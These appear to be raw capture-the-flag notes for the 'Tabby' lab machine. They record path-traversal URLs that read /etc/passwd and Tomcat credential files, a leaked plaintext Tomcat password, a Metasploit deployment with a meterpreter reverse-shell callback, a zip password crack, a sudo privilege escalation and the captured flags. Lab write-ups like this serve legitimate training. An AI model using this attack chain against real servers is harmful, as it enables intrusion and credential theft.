10.10.10.194

sudo nmap -sC -sV -Pn -p 10.10.10.194   

megahosting.htb
sales@megahosting.htb


```


We apologise to all our customers for the previous data breach.

We have changed the site to remove this tool, and have invested heavily in more secure servers

```


http://10.10.10.194/news.php?file=



root 
ash

http://10.10.10.194:8080



```
It works !

If you're seeing this page via a web browser, it means you've setup Tomcat successfully. Congratulations!

This is the default Tomcat home page. It can be found on the local filesystem at: /var/lib/tomcat9/webapps/ROOT/index.html

Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9, following the rules from /usr/share/doc/tomcat9-common/RUNNING.txt.gz.

You might consider installing the following packages, if you haven't already done so:

tomcat9-docs: This package installs a web application that allows to browse the Tomcat 9 documentation locally. Once installed, you can access it by clicking here.

tomcat9-examples: This package installs a web application that allows to access the Tomcat 9 Servlet and JSP examples. Once installed, you can access it by clicking here.

tomcat9-admin: This package installs two web applications that can help managing this Tomcat instance. Once installed, you can access the manager webapp and the host-manager webapp.

NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in /etc/tomcat9/tomcat-users.xml.
```

http://10.10.10.194/news.php?file=../../../../../etc/passwd
http://10.10.10.194/news.php?file=../../../../../../var/lib/tomcat9/CATALINA_BASE/conf/tomcat-users.xml



http://10.10.10.194/news.php?file=../../../../../usr/share/doc/tomcat9-common/RUNNING.txt.gz


$CATALINA_BASE/conf/tomcat-users.xml

http://10.10.10.194/news.php?file=../../../../../etc/default/tomcat/CATALINA_BASE/conf/tomcat-users.xml --> does not work


http://10.10.10.194/news.php?file=../../../../../etc/init.d/tomcat9 --> does not work

http://10.10.10.194/news.php?file=../../../../../var/lib/tomcat9/webapps/ROOT/index.html --> this works, got the file


http://10.10.10.194/news.php?file=../../../../../TOMCAT_HOME/conf/server.xml


http://10.10.10.194/news.php?file=../../../../../etc/passwd


http://10.10.10.194/news.php?file=../../../../../opt/tomcat/conf/tomcat-users.xsd

http://10.10.10.194/news.php?file=../../../../../$CATALINA_BASE/conf/tomcat-users.xsd


/opt/tomcat/latest/conf/tomcat-users.xml


http://10.10.10.194/news.php?file=../../../../../etc/systemd/system/tomcat.service

/opt/tomcat/latest
http://10.10.10.194/news.php?file=../../../../../opt/tomcat/latest/conf/server.xml

/conf/tomcat-users.xml

http://10.10.10.194/news.php?file=../../../../../opt/tomcat/latest/conf/content.xml


http://10.10.10.194/news.php?file=../../../../../opt/tomcat/latest/temp/tomcat.pid
http://10.10.10.194/news.php?file=../../../../../lib/catalina.jar


http://10.10.10.194/news.php?file=../../../../../opt/tomcat/latest/webapps/manager/META-INF/context.xml

http://10.10.10.194/news.php?file=../../../../../opt/tomcat/conf/tomcat-users.xml


http://10.10.10.194/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml



/opt/tomcat/conf/tomcat-users.xml
./opt/tomcat/conf/tomcat-users.xml
./etc/tomcat9/tomcat-users.xml

http://10.10.10.194/news.php?file=../../../../../etc/tomcat9/tomcat-users.xml

WHY DOES NOTHING WORK HOW IS THIS AN EASY BOX

http://10.10.10.194/news.php?file=../../../../../opt/tomcat/conf/tomcat-users.xml

/opt/tomcat/conf/tomcat-users.xsd


/usr/share/tomcat9/etc/tomcat-users.xml
/opt/tomcat/conf/tomcat-users.xsd
/opt/tomcat/conf/tomcat-users.xml
/etc/tomcat9/tomcat-users.xml

http://10.10.10.194/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
http://10.10.10.194/news.php?file=../../../../../opt/tomcat/conf/tomcat-users.xsd
http://10.10.10.194/news.php?file=../../../../../opt/tomcat/conf/tomcat-users.xml
http://10.10.10.194/news.php?file=../../../../../etc/tomcat9/tomcat-users.xml


http://10.10.10.194/news.php?file=../../../../../usr/lib/sysusers.d/tomcat9.conf
returns something at least


Configuration Environment="CATALINA_HOME=/usr/share/tomcat9" Environment="CATALINA_BASE=/var/lib/tomcat9"


confirmed, tomcat9 on box was installed using `apt-get install tomcat9`

  GNU nano 4.9.2                                    tomcatusers.xml                                               
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>



wget http://10.10.10.194/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml 

   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>

   has host-manager gui, but only manager script
   NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in /etc/tomcat9/tomcat-users.xml.

http://10.10.10.194:8080/host-manager/html/


https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/

tomcat:
$3cureP4s5w0rd123!


use

Module options (exploit/multi/http/tomcat_mgr_deploy):

   Name          Current Setting     Required  Description
   ----          ---------------     --------  -----------
   HttpPassword  $3cureP4s5w0rd123!  no        The password for the specified username
   HttpUsername  tomcat              no        The username to authenticate as
   PATH          /manager/text       yes       The URI path of the manager app (/deploy and /undeploy will be used)
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.10.194        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         8080                yes       The target port (TCP)
   SSL           false               no        Negotiate SSL/TLS for outgoing connections
   VHOST                             no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.30      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   3   Linux x86


msf5 exploit(multi/http/tomcat_mgr_deploy) > run


download var/www/html


root@kali:~# fcrackzip -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip 
possible pw found: admin@it ()


li><a href=""><span>Call us :</span>  <strong>(818) 995-1560</strong></a>
											</li>
									<li><a href=""><span>E-mail us :</span> <strong>XpeedStudio@gmail.com</strong> </a></li>

							<p>Can't decide which one best suits you?</p>
							<p class="phone_call">Call us - <strong>(818) 995-1560</strong></p>
							<div class="or_section">
								<div class="separator"></div>
								<p>or</p>
							</div>
							<p class="email_call">Email us - <strong>sales@digitallandscape.com</strong></p>


check who owns zip using `ls -l`

09335e957a2ec3eeb235aed3bf394a90



id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
cdrom access, dial up access, lxd

lxd has root exploit but our box has no internet



ash@tabby:/tmp$ sudo -l -U ash
sudo -l -U ash
Matching Defaults entries for ash on tabby:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ash may run the following commands on tabby:
    (ALL) NOPASSWD: ALL



sudo cat /root/root.txt

4654d92b1b4866d0ce8236ef83b4e03e

